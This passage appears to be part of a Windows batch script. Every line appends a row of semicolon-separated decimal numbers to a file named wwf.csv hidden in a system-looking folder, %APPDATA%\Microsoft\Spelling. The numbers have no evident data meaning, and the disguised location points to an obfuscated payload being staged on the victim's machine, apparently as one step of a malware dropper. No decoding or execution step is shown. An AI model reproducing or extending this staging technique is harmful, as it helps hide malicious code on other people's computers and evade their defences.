>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(667.0;4746.40;112.723;141.522;0.3867;30.1;337.22;340.59;5803.60;0.76;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.796;0.5258;70.6;862.40;53.0;6341.50;6.815;30.30;0.2905;510.122;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(72.123;931.0;4029.50;4.63;111.331;0.9684;70.10;438.42;626.115;7241.632;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.40;10.822;0.2805;60.0;727.48;64.0;6468.810;0.70;0.53;0.2935;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.17;32.40;598.0;9503.40;6.811;33.40;0.1861;510.22;649.95;42.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9682.798;0.70;6.811;34.6081;70.0;510.10;343.54;6807.76;111.635;0.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(10.7544;711.3;53.111;336.0;5266.50;10.744;32.53;111.9174;636.0;30.10;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.29;2509.30;0.610;44.419;3.5567;811.36;70.0;410.114;2585.763;0.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(112.37;40.9923;537.0;60.10;343.1;7934.37;111.538;0.70;10.9861;56.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(339.0;30.10;4365.445;194.922;17.56;117.4875;628.0;40.1;612.8;5843.444;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6.58;111.540;0.5015;70.10;920.42;40.0;7052.31;16.60;0.72;0.0240;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(526.0;766.92;30.17;3972.70;0.60;0.594;126.1105;902.0;30.4;445.10;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2599.815;15.60;0.66;128.4676;902.0;50.4;826.202;1163.50;0.74;42.354;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2.8334;826.41;40.0;610.20;7810.340;95.60;0.66;42.3957;70.0;527.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(66.0;0789.525;1.30;0.64;0.5305;50.17;815.42;50.0;1898.510;10.62;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.698;0.0920;30.6;811.34;50.0;0748.310;11.556;223.30;0.0302;40.7;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.35;50.0;3941.410;12.48;24.841;52.9236;30.0;51.37;422.31;2811.444;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(157.737;23.531;59.1018;857.111;543.0;30.10;7340.613;22.419;4.456;175.2097;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.0;40.9;517.4;4000.854;19.55;17.55;111.0500;329.0;30.10;557.151;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1673.40;0.60;20.419;6.5900;717.5;640.44;60.0;1607.710;19.37;17.77;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(114.4160;827.0;60.112;427.40;6767.545;0.30;10.444;67.9543;417.7;814.139;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.0;8504.812;27.540;45.50;0.5221;310.44;452.17;77.114;3675.847;0.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(112.727;40.0112;745.0;50.10;344.37;7163.740;46.30;0.410;114.9175;855.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.112;540.5;3466.30;0.66;23.841;22.6656;70.0;31.37;522.17;9964.45;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(162.340;28.60;0.6768;310.115;747.0;50.10;6676.822;17.35;18.46;40.8190;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(804.0;50.6;345.37;0358.740;46.30;0.310;114.7456;909.0;40.112;540.5;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4285.60;0.46;23.841;22.1859;40.0;31.37;622.17;7034.65;162.340;28.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.7872;310.115;747.0;70.10;0394.822;6.317;6.811;31.0235;60.0;310.38;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(717.4;8861.623;88.519;4.717;4.7044;39.142;805.63;371.255;6218.955;255.47;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.339;0.2558;60.10;758.22;955.255;5779.955;222.620;7.817;28.3939;70.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(41.19;78.17;9762.48;44.77;17.58;111.3011;740.0;30.10;920.6;7228.542;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.30;0.41;16.9369;30.0;52.0;718.0;7530.941;3.31;20.60;0.7893;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.0;694.126;903.0;9252.30;4.745;10.815;19.9018;30.0;56.128;903.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7977.60;4.826;203.40;0.1500;54.42;810.2;814.249;0564.30;0.812;40.35;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.6754;60.6;814.9;61.0;7965.812;40.75;0.50;6.5434;540.95;40.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(76.42;7780.319;48.75;0.371;0.2800;40.0;70.0;70.0;6702.63;44.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3.811;29.1219;70.0;410.45;735.114;0503.367;0.40;112.423;141.4974;622.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.1;437.22;4386.540;18.40;0.66;111.7783;796.0;40.6;862.40;2782.73;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.60;6.815;30.4208;70.0;710.122;42.123;5583.931;0.30;4.811;48.1945;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.0;710.2;823.231;6642.60;0.34;3.811;31.3621;70.0;510.38;742.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0767.62;40.798;0.70;6.7308;811.33;40.0;410.44;9812.613;2.440;98.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.0690;66.22;811.49;60.0;0891.710;42.320;42.794;126.1760;904.0;40.4;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(345.10;9237.815;24.40;0.66;128.4910;904.0;70.4;826.204;4624.30;0.74;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(42.810;2.0777;814.27;61.0;812.40;9177.35;0.70;6.814;63.4091;71.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(812.40;65.0;7207.70;6.340;95.40;0.4844;46.42;802.2;823.231;3777.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.74;111.448;0.5862;70.10;72.123;931.0;6642.50;4.43;111.331;0.7107;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.10;338.42;70.0;4962.319;48.46;0.839;0.1742;70.0;75.0;50.17;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3645.826;41.60;0.710;10.6454;32.40;698.0;30.6;1257.811;33.40;0.410;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(23.6335;647.1;342.2;640.98;9513.30;0.36;22.811;49.8668;50.0;310.10;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(53.111;5440.550;0.40;10.640;119.8620;50.0;66.45;656.6;5040.811;29.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.510;44.3287;583.3;811.36;40.0;8463.610;45.311;3.826;41.2054;40.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(710.111;438.0;0703.50;10.43;37.811;36.3264;50.0;710.114;801.1;8380.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(112.440;5.50;0.8392;56.6;340.37;50.0;0982.410;111.638;0.30;10.8535;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(342.40;646.0;50.10;4636.814;139.41;0.812;40.6154;55.0;30.6;723.141;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7324.422;0.30;1.637;22.1602;66.162;340.28;30.0;9884.510;40.751;0.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(10.2045;642.126;814.191;71.0;2059.812;40.55;0.30;6.5925;828.205;70.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(44.114;9007.909;1.50;112.540;5.0607;60.0;66.128;906.0;5330.60;4.642;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(94.826;207.9608;40.0;34.45;310.115;1323.730;0.60;6.828;207.5415;50.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(34.126;907.0;5798.40;4.542;178.72;114.7344;917.1;60.112;740.5;6987.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.46;114.939;1.1278;40.112;440.5;70.0;9529.46;40.395;0.30;6.9424;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(72.123;931.0;50.4;8590.826;205.60;0.64;111.2700;531.0;30.10;738.42;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3890.719;48.45;0.671;0.2588;30.0;70.0;40.0;8335.63;24.841;49.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.4655;41.37;622.126;905.0;9694.30;4.862;37.623;126.9551;906.0;60.4;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(862.40;7209.801;0.50;6.645;16.4185;814.7;32.0;812.40;8113.45;0.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6.815;52.4603;50.0;410.122;72.123;1611.931;0.40;4.811;48.7793;30.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(310.2;823.231;4428.30;0.44;3.811;31.8800;40.0;510.38;442.98;5817.72;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.798;0.40;6.3295;622.111;349.0;30.10;7961.826;205.30;0.34;27.3600;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.53;30.0;410.42;2784.798;2.340;98.60;0.0010;46.22;811.49;30.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4794.510;126.906;0.40;4.9927;627.111;553.0;40.10;5376.542;94.826;208.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.6035;64.45;510.115;535.0;4208.50;6.828;208.50;0.9323;54.126;908.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.4;6162.442;110.62;114.657;2.4923;70.112;440.5;70.0;5961.56;114.681;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2.70;112.0881;640.5;40.0;56.40;2825.395;0.60;6.642;242.5714;53.44;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.3;811.29;3905.30;0.310;45.635;114.6270;767.0;40.112;323.141;1116.622;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.50;1.537;22.8044;740.34;40.0;66.111;1714.596;0.40;6.862;40.9381;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(43.0;40.6;815.30;7608.40;0.410;122.52;123.8914;931.0;70.4;63.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0091.631;0.50;10.638;42.7332;50.0;327.48;46.0;7171.877;0.50;0.66;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.3603;60.17;815.42;50.0;5406.710;10.62;40.398;0.7245;70.6;811.34;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.0;9332.710;11.343;122.57;111.3109;735.0;50.10;512.8;4048.624;141.352;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.50;1.2094;437.22;631.44;857.37;3317.323;31.759;157.811;43.9215;40.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(610.13;422.19;6963.54;43.480;9.517;4.4166;854.19;65.17;65.111;8790.629;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.40;10.444;59.9746;417.5;318.6;340.105;4306.70;0.66;44.511;6.0270;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(517.6;811.31;40.0;1191.310;38.543;37.340;46.8115;60.0;610.114;807.2;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1169.70;112.540;5.60;0.0232;76.23;841.22;30.0;0677.31;37.622;17.45;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(162.9414;440.28;30.0;410.115;5681.647;0.70;10.822;17.8910;54.23;588.19;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(44.17;8519.34;9.842;105.350;169.4389;37.111;639.0;30.10;1616.458;123.955;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(255.955;222.0298;420.7;817.28;70.0;3918.61;19.77;17.67;44.7648;47.17;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(77.111;540.0;2631.30;10.920;6.342;0.6335;50.0;61.16;50.0;3485.42;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.518;0.837;155.1707;70.20;40.0;60.0;3079.594;126.909;0.40;4.6167;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(645.10;815.40;30.0;0599.46;128.909;0.60;4.7810;826.209;60.0;34.42;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0530.810;2.814;149.42;0.7589;812.40;65.0;70.6;6806.814;177.62;0.812;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.1986;45.0;70.6;440.95;8198.40;0.36;42.942;3.5823;544.8;43.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(529.0;1659.60;10.545;35.814;67.9521;70.0;812.23;841.22;6265.40;0.61;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(37.322;40.6122;639.0;70.6;811.96;0857.30;0.36;162.540;3.1034;70.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(36.115;530.0;8106.60;10.822;2.823;231.4848;40.0;74.3;811.31;3157.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.610;38.742;0.9061;50.0;627.48;55.0;1188.842;0.30;0.37;0.8214;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.17;32.40;398.0;1703.30;6.811;34.70;0.0336;410.10;343.97;46.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6677.535;0.60;10.711;7.9517;724.141;752.0;60.1;8555.637;22.331;44.857;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(37.6854;523.31;759.157;811.43;2502.50;0.710;12.622;13.9528;643.57;38.9;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(854.19;2542.34;17.34;24.841;52.7959;50.0;71.37;522.31;4466.334;157.737;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(23.431;32.3004;857.111;454.0;40.10;0595.619;5.717;5.811;29.0741;30.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(510.44;314.3;9055.811;55.70;0.310;17.4551;45.111;631.0;70.10;5920.538;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9.723;88.713;9.0604;38.142;805.50;893.6;4107.811;39.40;0.310;45.8821;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(851.222;620.6;817.28;2512.50;0.71;19.36;17.7081;56.44;47.17;56.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1873.640;0.30;10.920;42.3981;30.0;51.16;60.0;0226.42;0.512;0.809;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(121.8548;30.20;30.0;50.0;0227.494;126.910;0.60;4.6929;345.10;815.45;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.0;8686.46;128.910;0.70;4.2721;826.210;70.0;64.42;2413.810;2.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(207.52;0.3433;812.40;45.0;60.6;5990.814;233.62;0.812;40.8467;45.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.6;440.95;5433.50;0.66;42.942;3.9165;544.8;33.111;629.0;3309.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(10.445;35.814;67.3807;50.0;812.23;841.22;7846.40;0.61;37.322;40.4516;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(444.0;70.6;811.96;3951.40;0.66;162.540;3.3406;60.0;66.115;630.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8421.50;10.822;2.823;231.1527;30.0;54.3;811.31;9989.60;0.310;38.742;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.3352;70.0;427.48;44.0;0700.396;0.30;0.33;0.9023;50.17;52.123;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(931.0;5324.70;4.811;34.70;0.0843;510.10;443.54;66.111;1654.535;0.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(10.711;3.2363;811.36;70.0;310.45;8991.411;3.826;41.40;0.9375;310.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(438.0;50.10;9591.43;37.811;36.60;0.1064;610.114;35.3;60.112;1216.47;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.808;0.50;6.2568;640.37;30.0;410.111;1825.438;0.30;10.46;111.0211;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(339.0;30.10;745.194;5495.922;17.36;117.328;0.3171;60.1;512.8;544.6;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9121.68;111.640;0.40;10.4946;920.42;31.16;50.0;0141.42;0.712;0.766;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(78.8727;50.17;40.0;30.0;5649.826;114.529;3.30;112.1676;340.5;40.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(36.128;6091.911;0.60;4.814;37.2602;33.0;812.40;65.0;4477.40;6.828;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(212.70;0.9453;54.42;494.126;913.0;0898.50;4.445;10.815;51.9842;30.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(56.128;913.0;1767.60;4.826;213.40;0.1471;64.42;842.2;814.43;2724.33;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.812;40.65;0.8001;60.6;320.40;495.0;1124.40;6.32;123.931;0.8487;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.4;826.211;30.0;5871.64;111.431;0.60;10.3555;438.42;319.48;65.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9919.471;0.60;0.60;0.9551;40.0;73.24;841.49;6644.70;0.61;37.422;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(126.0150;911.0;40.4;862.37;9748.423;126.912;0.70;4.4423;862.40;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.6;2823.545;16.814;63.63;0.5551;812.40;55.0;50.6;9136.815;47.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.510;122.2499;32.123;931.0;70.4;2057.811;48.60;0.610;2.4038;823.231;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.0;54.3;6946.811;31.40;0.710;38.4482;342.0;519.48;33.0;7461.443;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.30;0.35;0.4986;50.17;62.40;498.0;3841.60;6.422;111.749;0.9002;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.10;610.6;826.211;5836.40;0.34;27.811;53.1017;40.0;410.44;58.3;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3781.623;111.456;0.70;10.4398;542.3;422.111;456.0;0194.70;10.342;126.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.4337;53.0;812.40;45.0;0302.30;6.828;214.40;0.8780;74.114;817.3;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.112;7395.740;5.50;0.46;128.3388;915.0;40.4;442.94;9546.826;216.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.34;45.2761;710.115;356.0;70.6;2281.828;216.30;0.64;126.9873;916.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.4;742.178;6874.52;114.823;3.70;112.0254;640.5;70.0;36.114;2071.849;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3.60;112.340;5.6771;70.0;56.40;795.0;4663.60;6.52;123.931;0.7152;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.4;826.214;50.0;4923.64;111.331;0.50;10.6116;638.42;419.48;55.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5120.471;0.60;0.50;0.5826;60.0;43.24;841.49;8352.40;0.31;37.722;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(126.0779;914.0;60.4;862.37;8246.723;126.915;0.30;4.2291;862.40;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.6;1957.745;16.814;177.53;0.0415;812.40;75.0;60.6;2662.815;47.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.610;122.4315;32.123;931.0;50.4;3382.811;48.70;0.510;2.8481;823.231;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.0;54.3;1353.811;31.60;0.710;38.2761;742.0;419.48;43.0;8542.351;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.40;0.65;0.6549;60.17;72.40;798.0;5575.70;6.322;111.349;0.0820;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.10;610.6;826.214;2784.70;0.64;27.811;53.8092;30.0;410.44;312.3;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3101.814;231.73;0.812;111.5147;557.0;60.10;642.3;6371.814;117.73;0.812;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.7905;557.0;40.10;442.94;3765.826;217.30;0.54;45.4736;610.115;760.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.6;2060.828;217.50;0.44;126.3067;917.0;40.4;442.74;1873.72;114.945;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3.60;112.0412;540.5;60.0;56.20;2808.540;95.70;0.66;42.0126;40.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(619.48;65.0;9872.571;0.50;0.70;0.7509;30.0;33.44;48.3;4766.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(29.70;0.710;45.4295;335.114;367.0;40.112;5712.523;141.622;0.60;1.0301;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(337.22;640.59;60.0;0351.56;111.496;0.40;6.3106;862.40;73.0;60.6;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4152.815;30.50;0.410;122.1441;52.123;931.0;60.4;6394.811;48.30;0.710;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2.1398;823.231;40.0;34.3;2349.811;31.40;0.510;38.7796;442.0;619.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(55.0;2755.836;0.40;0.48;0.6803;70.17;42.40;598.0;5521.70;6.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(33.60;0.6080;410.22;349.121;42.40;6821.698;0.50;6.422;111.9509;349.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.10;710.6;9742.431;32.811;58.50;0.6336;410.21;646.17;814.5;6198.74;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.812;6.814;5.7945;44.0;812.40;337.0;0019.60;10.610;3.811;36.5265;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.0;710.45;611.3;3719.826;41.50;0.410;111.9604;738.0;30.10;53.11;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6568.77;27.841;49.50;0.7431;51.37;522.7;811.36;9286.60;0.310;162.437;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(23.2119;814.9;34.0;812.162;1374.637;24.814;245.43;0.0537;812.40;65.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.6;2191.862;37.325;114.615;4.6527;70.112;862.37;526.6;4860.862;40.659;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.70;10.3568;811.38;50.0;510.42;8095.594;126.918;0.60;4.9438;345.10;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(815.65;60.0;5473.66;128.918;0.70;4.3841;826.218;30.0;34.42;5853.674;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2.814;19.44;0.2415;812.40;65.0;30.6;5832.520;40.495;0.30;6.7855;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(542.0;419.48;35.0;8293.471;0.50;0.50;0.8667;60.0;33.44;48.3;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9092.811;29.70;0.710;45.1373;335.114;767.0;50.112;0862.523;141.422;0.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1.5292;437.22;640.64;30.0;2274.76;111.496;0.60;6.8338;862.40;43.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.6;9330.815;30.40;0.310;122.9326;62.123;931.0;70.4;1490.811;48.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.310;2.0078;823.231;30.0;74.3;8466.811;31.70;0.410;38.9883;342.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(319.48;35.0;2673.836;0.60;0.38;0.4478;50.17;32.40;798.0;7282.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6.811;33.40;0.8054;710.22;749.121;62.40;4251.498;0.50;6.422;111.2350;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(649.0;50.10;710.6;8618.731;32.811;58.30;0.9478;610.21;346.17;814.5;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0744.34;0.812;6.814;5.6139;34.0;812.40;337.0;8135.40;10.710;3.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(36.8534;50.0;510.45;611.3;6990.826;41.50;0.610;111.8381;438.0;40.10;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(63.11;2912.77;27.841;49.40;0.3383;41.37;622.7;811.36;2203.70;0.710;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(162.637;23.4531;814.9;54.0;812.162;6741.737;24.814;19.74;0.5050;812.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(75.0;70.6;7567.862;37.425;114.715;4.3381;30.112;862.37;326.6;2040.862;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.459;0.60;10.0538;811.38;40.0;710.42;8242.826;114.529;3.50;112.2701;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(440.5;60.0;66.128;3120.919;0.40;4.814;37.8511;53.0;812.40;75.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2931.30;6.828;220.60;0.5028;74.42;694.126;921.0;6124.30;4.645;10.815;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(71.6928;60.0;76.128;921.0;5266.30;4.826;221.60;0.9700;64.42;374.2;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.45;1601.44;0.812;40.65;0.8551;60.6;320.40;695.0;1149.70;6.742;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.619;48.2985;45.0;671.0;70.0;2447.30;0.40;0.63;24.6831;841.49;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.0;71.37;9559.722;126.919;0.30;4.5735;862.37;423.126;920.0;1940.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4.862;40.801;0.3394;30.6;745.16;814.65;4823.54;0.812;40.55;0.7436;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.6;815.47;30.0;1266.310;122.32;123.931;0.4344;50.4;811.48;50.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3392.610;2.823;231.40;0.3065;54.3;811.31;60.0;0626.410;38.442;0.719;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.0436;75.0;836.0;60.0;6888.35;0.40;17.72;40.9127;798.0;30.6;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.33;5980.50;0.410;22.749;121.9214;42.40;798.0;60.6;7730.522;111.749;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.70;10.3921;510.3;811.36;40.0;7545.410;45.311;3.826;41.2548;70.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(510.111;738.0;7005.50;10.66;126.919;0.2502;40.4;627.111;353.0;8521.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(10.544;38.63;37.0771;811.36;60.0;710.114;0812.79;4.70;112.814;45.3696;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(64.0;812.40;35.0;8790.40;6.814;121.34;0.1622;812.40;460.0;40.10;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8503.811;38.40;0.710;42.0603;63.37;811.36;40.0;7749.610;114.79;4.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(112.3974;814.45;74.0;812.40;6421.35;0.30;6.814;125.7021;74.0;812.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(360.0;3954.50;10.811;38.70;0.7325;710.42;794.126;922.0;9899.40;4.345;
